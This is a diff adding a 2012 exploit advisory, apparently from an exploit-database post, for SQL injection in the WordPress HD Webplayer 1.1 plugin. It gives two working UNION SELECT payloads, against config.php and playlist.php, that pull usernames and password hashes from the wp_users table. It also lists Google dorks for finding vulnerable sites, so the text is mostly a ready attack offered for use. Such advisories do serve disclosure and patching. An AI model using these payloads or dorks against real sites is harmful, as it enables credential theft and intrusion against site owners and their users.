@@ -1,0 +1,65 @@
+   _______                     _____ _   _ _______ _____            
+  |__   __|                   |_   _| \ | |__   __|  __ \     /\    
+     | | ___  __ _ _ __ ___     | | |  \| |  | |  | |__) |   /  \   
+     | |/ _ \/ _` | '_ ` _ \    | | | . ` |  | |  |  _  /   / /\ \  
+     | |  __/ (_| | | | | | |  _| |_| |\  |  | |  | | \ \  / ____ \ 
+     |_|\___|\__,_|_| |_| |_| |_____|_| \_|  |_|  |_|  \_\/_/    \_\
+                                                          - JoinSe7en
+
+
++----------------------------------------------------------------------+
+|               Wordpress HD Webplayer 1.1 SQL Injection               |
+|                    Author: JoinSe7en [Team INTRA]                    |
++----------------------------------------------------------------------+
+
+# Exploit Title: Wordpress HD Webplayer 1.1 SQL Injection
+# Date: 28/08/2012
+# Exploit Author: JoinSe7en
+# Vendor Homepage: http://www.hdwebplayer.com/
+# Software Link: http://hdwebplayer.com/downloads/hdwebplayer_wordpress_1.1.zip
+# Category: Web Application 0-Day
+# Version: version 1.1
+# Tested on: Windows 7, Backtrack 5 r3
+
++----------------------------------------------------------------------+
+|                     Vulnerability 1 - config.php                     |
++----------------------------------------------------------------------+
+
+# Location:
+
+http://site.com/wp-content/plugins/hd-webplayer/config.php?id= [INJECT HERE]
+
+# Exploit Code:
+
+config.php?id=1+/*!UNION*/+/*!SELECT*/+1,2,3,group_concat(ID,0x3a,user_login,0x3a,user_pass,0x3b),5,6,7+from+wp_users //Number of columns may be different
+
++----------------------------------------------------------------------+
+|                    Vulnerability 2 - playlist.php                    |
++----------------------------------------------------------------------+
+
+# Location:
+
+http://site.com/wp-content/plugins/hd-webplayer/playlist.php?videoid= [INJECT HERE]
+
+# Exploit Code:
+
+playlist.php?videoid=1+/*!UNION*/+/*!SELECT*/+group_concat(ID,0x3a,user_login,0x3a,user_pass,0x3b),2,3,4,5,6,7+from+wp_users //Number of columns may be different
+
++----------------------------------------------------------------------+
+|                             Google Dork                              |
++----------------------------------------------------------------------+
+
+There are 3 different usefull dorks to use:
+
+# Dork 1 (config.php)
+inurl:"/wp-content/plugins/hd-webplayer/config.php?id="
+
+# Dork 2 (playlist.php)
+inurl:"/wp-content/plugins/hd-webplayer/playlist.php?videoid="
+
+# Dork 3 (General):
+inurl:"/wp-content/plugins/hd-webplayer/"
+
++----------------------------------------------------------------------+
+
+Greetz to all members of Team INTRA <3
